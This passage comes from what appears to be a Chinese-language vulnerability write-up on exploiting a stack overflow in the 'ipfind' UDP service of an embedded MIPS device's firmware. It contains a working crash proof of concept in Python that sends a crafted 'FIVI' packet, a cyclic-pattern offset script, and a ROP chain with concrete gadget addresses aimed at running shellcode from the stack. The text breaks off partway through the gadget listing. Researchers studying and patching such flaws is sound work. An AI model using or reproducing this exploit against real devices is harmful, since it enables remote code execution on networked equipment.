/etc/rc.d/rcS</span></span><br></pre></td></tr></tbody></table></figure><p>固件里的服务启动完毕，直接寻找一下ipfind服务</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./busybox-mips netstat -ulnp</span></span><br><span class="line">netstat: showing only processes with your user ID</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           1575/rpcbind</span><br><span class="line">udp        0      0 0.0.0.0:902             0.0.0.0:*                           1575/rpcbind</span><br><span class="line">udp        0      0 127.0.0.1:934           0.0.0.0:*                           1606/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:49110           0.0.0.0:*                           1606/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:8166            0.0.0.0:*                           2306/dhclient</span><br><span class="line">udp        0      0 0.0.0.0:62976           0.0.0.0:*                           7743/ddp</span><br><span class="line">udp        0      0 0.0.0.0:62720           0.0.0.0:*                           7601/ipfind</span><br><span class="line">udp        0      0 0.0.0.0:62976           0.0.0.0:*                           3335/ddp</span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           2306/dhclient</span><br><span class="line">udp        0      0 :::111                  :::*                                1575/rpcbind</span><br><span class="line">udp        0      0 :::902                  :::*                                1575/rpcbind</span><br><span class="line">udp        0      0 :::37004                :::*                                1606/rpc.statd</span><br><span class="line">udp        0      0 :::15167                :::*                                2306/dhclient</span><br></pre></td></tr></tbody></table></figure><p>可以看到ipfind在62720这里开启了一个监听，和上面分析得一样</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ps aux | grep ipfind</span></span><br><span class="line"> 7601 0         2096 S    /usr/sbin/ipfind br0</span><br><span class="line">12490 0          788 S    grep ipfind</span><br></pre></td></tr></tbody></table></figure><p>但是ps看了一下发现这个在br0，但是我们的有效网卡是eth0，所以kill掉这个ipfind，重新启动</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kill 7601</span></span><br><span class="line"><span class="comment"># ps aux | grep ipfind</span></span><br><span class="line">26451 0          788 S    grep ipfind</span><br><span class="line"><span class="comment"># /usr/sbin/ipfind eth0 &amp;</span></span><br><span class="line"><span class="comment"># ps aux | grep ipfind</span></span><br><span class="line">28360 0         2096 S    /usr/sbin/ipfind eth0</span><br><span class="line">28440 0          788 S    grep ipfind</span><br><span class="line"><span class="comment"># ./busybox-mips netstat -ulnp</span></span><br><span class="line">netstat: showing only processes with your user ID</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           1575/rpcbind</span><br><span class="line">udp        0      0 0.0.0.0:902             0.0.0.0:*                           1575/rpcbind</span><br><span class="line">udp        0      0 127.0.0.1:934           0.0.0.0:*                           1606/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:49110           0.0.0.0:*                           1606/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:8166            0.0.0.0:*                           2306/dhclient</span><br><span class="line">udp        0      0 0.0.0.0:62720           0.0.0.0:*                           28360/ipfind</span><br><span class="line">udp        0      0 0.0.0.0:62976           0.0.0.0:*                           7743/ddp</span><br><span class="line">udp        0      0 0.0.0.0:62976           0.0.0.0:*                           3335/ddp</span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           2306/dhclient</span><br><span class="line">udp        0      0 :::111                  :::*                                1575/rpcbind</span><br><span class="line">udp        0      0 :::902                  :::*                                1575/rpcbind</span><br><span class="line">udp        0      0 :::37004                :::*                                1606/rpc.statd</span><br><span class="line">udp        0      0 :::15167                :::*                                2306/dhclient</span><br></pre></td></tr></tbody></table></figure><p>现在就可以用gdbserver进行远程调试了，用法如下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver-mips :6666 --attach 28360</span><br></pre></td></tr></tbody></table></figure><p>然后就可以用IDA或者gdb-multiarch来进行调试，笔者这里的gdb-multiarch调试失败了，所以改用了ida调试</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先肯定要确定偏移，这里用如下脚本生成垃圾数据</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">生成定位字符串：轮子直接使用</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">a =<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">b =<span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">c = <span class="string">"0123456789"</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">count,output</span>):</span><br><span class="line">    <span class="comment"># pattern create</span></span><br><span class="line">    codeStr =<span class="string">''</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">'[*] Create pattern string contains %d characters'</span>%count</span><br><span class="line">    timeStart = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,count):</span><br><span class="line">        codeStr += a[i/(<span class="number">26</span>*<span class="number">10</span>)] + b[(i%(<span class="number">26</span>*<span class="number">10</span>))/<span class="number">10</span>] + c[i%(<span class="number">26</span>*<span class="number">10</span>)%<span class="number">10</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'ok!'</span></span><br><span class="line">    <span class="keyword">if</span> output:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">'[+] output to %s'</span>%output</span><br><span class="line">        fw = <span class="built_in">open</span>(output,<span class="string">'w'</span>)</span><br><span class="line">        fw.write(codeStr)</span><br><span class="line">        fw.close()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">'ok!'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> codeStr</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"[+] take time: %.4f s"</span>%(time.time()-timeStart)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patternMatch</span>(<span class="params">searchCode, length=<span class="number">1024</span></span>):</span><br><span class="line"> </span><br><span class="line">   <span class="comment"># pattern search</span></span><br><span class="line">   offset = <span class="number">0</span></span><br><span class="line">   pattern = <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">   timeStart = time.time()</span><br><span class="line">   is0xHex = re.match(<span class="string">'^0x[0-9a-fA-F]{8}'</span>,searchCode)</span><br><span class="line">   isHex = re.match(<span class="string">'^[0-9a-fA-F]{8}'</span>,searchCode)</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> is0xHex:</span><br><span class="line">       <span class="comment">#0x41613141</span></span><br><span class="line">       pattern = binascii.a2b_hex(searchCode[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> isHex:</span><br><span class="line">       pattern = binascii.a2b_hex(searchCode)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span>  <span class="string">'[-] seach Pattern eg:0x41613141'</span></span><br><span class="line">       sys.exit(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">   source = generate(length,<span class="literal">None</span>)</span><br><span class="line">   offset = source.find(pattern)</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> offset != -<span class="number">1</span>: <span class="comment"># MBS</span></span><br><span class="line">       <span class="built_in">print</span> <span class="string">"[*] Exact match at offset %d"</span> % offset</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span></span><br><span class="line">       <span class="string">"[*] No exact matches, looking for likely candidates..."</span></span><br><span class="line">       reverse = <span class="built_in">list</span>(pattern)</span><br><span class="line">       reverse.reverse()</span><br><span class="line">       pattern = <span class="string">""</span>.join(reverse)</span><br><span class="line">       offset = source.find(pattern)</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">if</span> offset != -<span class="number">1</span>:</span><br><span class="line">           <span class="built_in">print</span> <span class="string">"[+] Possible match at offset %d (adjusted another-endian)"</span> % offset</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">print</span> <span class="string">"[+] take time: %.4f s"</span> % (time.time() - timeStart)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mian</span>():</span><br><span class="line">   <span class="string">'''</span></span><br><span class="line"><span class="string">   parse argument</span></span><br><span class="line"><span class="string">   '''</span></span><br><span class="line">   parser = argparse.ArgumentParser()</span><br><span class="line">   parser.add_argument(<span class="string">'-s'</span>, <span class="string">'--search'</span>, <span class="built_in">help</span>=<span class="string">'search for pattern'</span>)</span><br><span class="line">   parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--create'</span>, <span class="built_in">help</span>=<span class="string">'create a pattern'</span>,action=<span class="string">'store_true'</span>)</span><br><span class="line">   parser.add_argument(<span class="string">'-f'</span>,<span class="string">'--file'</span>,<span class="built_in">help</span>=<span class="string">'output file name'</span>,default=<span class="string">'patternShell.txt'</span>)</span><br><span class="line">   parser.add_argument(<span class="string">'-l'</span>, <span class="string">'--length'</span>, <span class="built_in">help</span>=<span class="string">'length of pattern code'</span>,<span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1024</span>)</span><br><span class="line">   args = parser.parse_args()</span><br><span class="line">   <span class="string">'''</span></span><br><span class="line"><span class="string">   save all argument</span></span><br><span class="line"><span class="string">   '''</span></span><br><span class="line">   length= args.length</span><br><span class="line">   output = args.file</span><br><span class="line">   createCode = args.create</span><br><span class="line">   searchCode = args.search</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> createCode <span class="keyword">and</span> (<span class="number">0</span> &lt;args.length &lt;= <span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">       generate(length,output)</span><br><span class="line">   <span class="keyword">elif</span> searchCode <span class="keyword">and</span> (<span class="number">0</span> &lt;args.length &lt;=<span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">       patternMatch(searchCode,length)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span> <span class="string">'[-] You shoud chices from [-c -s]'</span></span><br><span class="line">       <span class="built_in">print</span> <span class="string">'[-] Pattern length must be less than 6760'</span></span><br><span class="line">       <span class="built_in">print</span> <span class="string">'more help: pattern.py -h'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       mian()</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 pattern.py -c -l 800 -f content</span><br></pre></td></tr></tbody></table></figure><p>生成了800个垃圾数据，如下poc进行偏移确定</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">b'FIVI'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\n'</span></span><br><span class="line">p2 += <span class="string">b'\x02\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p2 += mac_addr</span><br><span class="line">p2 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x8E'</span></span><br><span class="line">p2 = p2.ljust(<span class="number">0x5d</span>, <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9'</span></span><br><span class="line"></span><br><span class="line">p2 += base64.b64encode(p3)</span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendto(p2, (ip, port))</span><br></pre></td></tr></tbody></table></figure><p>ida调试中最后发现$ra被覆盖成了<code>41743641</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 pattern.py -s 0x41743641 -f content</span><br><span class="line">[*] Create pattern string contains 1024 characters</span><br><span class="line">ok!</span><br><span class="line">[*] Exact match at offset 588</span><br><span class="line">[+] take time: 0.0004 s</span><br></pre></td></tr></tbody></table></figure><p>最后得到偏移为588，现在可以控制ra了，接下来需要寻找gadgets来getshell</p><p>程序保护都没开，所以有很多选择，这里采取的是ret2shellcode，把shellcode放到栈上，然后跳转执行即可，但是需要一个栈地址</p><p>在跳转之前需要注意一个gp寄存器，gp寄存器它的值被用来定位静态数据区域，所以要保证gp寄存器不会出错</p><p>这个值是这样算的，在ropgadget筛选的时候可以看到strcmp这里-0x7f9c，所以对应这里<code>strcmp + 0x7f9c = 0x0041B030</code></p><p>下面这个gadgets执行完毕之后会调用close清空a0, a1, a2，为得是不影响后一个gadgets的使用，并且可以控制gp和ra</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004020A4 8F BC 00 18                   lw      $gp, 0x7C+var_64($sp)</span><br><span class="line">.text:004020A8 8F 99 80 38                   la      $t9, close</span><br><span class="line">.text:004020AC 03 20 F8 09                   jalr    $t9 ; close</span><br><span class="line">.text:004020B0 02 00 20 21                   move    $a0, $s0                         # fd</span><br><span class="line">.text:004020B0</span><br><span class="line">.text:004020B4</span><br><span class="line">.text:004020B4                               loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j</span><br><span class="line">.text:004020B4                                                                        # sub_401DF4+238↑j</span><br><span class="line">.text:004020B4                                                                        # sub_401DF4+284↑j</span><br><span class="line">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span><br><span class="line">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span><br><span class="line">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span><br><span class="line">.text:004020C0 03 E0 00 08                   jr      $ra</span><br><span class="line">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span><br></pre></td></tr></tbody></table></figure><p>接着控制ra为下一个gadgets的地址</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:00401F98 0C 10 04 F4                   jal     my_puts</span><br><span class="line">.text:00401F9C 24 84 2C F8                   li      $a0, aCanTGetHelloSo             # "Can't get hello socket\n"</span><br><span class="line">.text:00401F9C</span><br><span class="line">.text:00401FA0 10 00 00 44                   b       loc_4020B4</span><br><span class="line">.text:00401FA4 00 00 00 00                   nop</span><br><span class="line"></span><br><span class="line">my_puts</span><br><span class="line">.text:004013D0 addiu   $sp, -0x10</span><br><span class="line">.text:004013D4 sw      $a1, 0x10+arg_4($sp)</span><br><span class="line">.text:004013D8 sw      $a2, 0x10+arg_8($sp)</span><br><span class="line">.text:004013DC sw      $a3, 0x10+arg_C($sp)</span><br><span class="line">.text:004013E0 addiu   $v0, $sp, 0x10+arg_4</span><br><span class="line">.text:004013E4 sw      $v0, 0x10+var_8($sp)</span><br><span class="line">.text:004013E8 addiu   $sp, 0x10</span><br><span class="line">.text:004013EC jr      $ra</span><br><span class="line">.text:004013F0 nop</span><br><span class="line"></span><br><span class="line">loc_4020B4</span><br><span class="line">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span><br><span class="line">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span><br><span class="line">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span><br><span class="line">.text:004020C0 03 E0 00 08                   jr      $ra</span><br><span class="line">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span><br></pre></td></tr></tbody></table></figure><p>上面这个gadgets详细说一下，首先是进入my_puts这里</p><p>这里<code>addiu   $v0, $sp, 0x10+arg_4</code>把栈上的地址给存到了v0中，然后又把v0的值放到了sp + 0x8这里</p><p>在4020b4中可以控制s0，这里把s0控制成<code>0x00413200 - 0xd</code>，这是因为下面的gadgets需要用到</p><p>然后又到了<code>loc_4020B4</code>这里，这里可以控制$ra，那么就可以继续ROP下去，接着到<code>0x00400C9C</code>这里的gadgets</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20</span><br></pre></td></tr></tbody></table></figure><p>恢复GP，然后控制ra到<code>0x00400F28</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:00400F28 AE 02 00 0D                   sw      $v0, 0xD($s0)</span><br><span class="line">.text:00400F28</span><br><span class="line">.text:00400F2C</span><br><span class="line">.text:00400F2C                               loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j</span><br><span class="line">.text:00400F2C 8F 82 80 68                   la      $v0, ifname</span><br><span class="line">.text:00400F30 8C 44 00 00                   lw      $a0, (ifname - 0x413138)($v0)</span><br><span class="line">.text:00400F34 8F 99 80 8C                   la      $t9, net_get_hwaddr</span><br><span class="line">.text:00400F38 03 20 F8 09                   jalr    $t9 ; net_get_hwaddr</span><br><span class="line">.text:00400F3C 26 05 00 11                   addiu   $a1, $s0, 0x11</span><br><span class="line">.text:00400F3C</span><br><span class="line">.text:00400F40 8F BF 00 24                   lw      $ra, 0x20+var_s4($sp)</span><br><span class="line">.text:00400F44 8F B0 00 20                   lw      $s0, 0x20+var_s0($sp)</span><br><span class="line">.text:00400F48 03 E0 00 08                   jr      $ra</span><br><span class="line">.text:00400F4C 27 BD 00 28                   addiu   $sp, 0x28</span><br></pre></td></tr></tbody></table></figure><p>然后这里就需要用到上面的把s0控制成<code>0x00413200 - 0xd</code>，在<code>sw      $v0, 0xD($s0)</code>这里是把v0的值放到s0 + 0xd这个位置，这个位置是<code>0x413200</code>是net_get_dns，这样的话net_get_dns这里就是v0，就是栈上的地址了，如果调用net_get_dns的时候就会调用栈上的地址</p><p>在gadgets的最后可以控制s0和ra，控制s0为net_get_dns的值也就是栈上的地址，控制ra为<code>0x004027C8</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 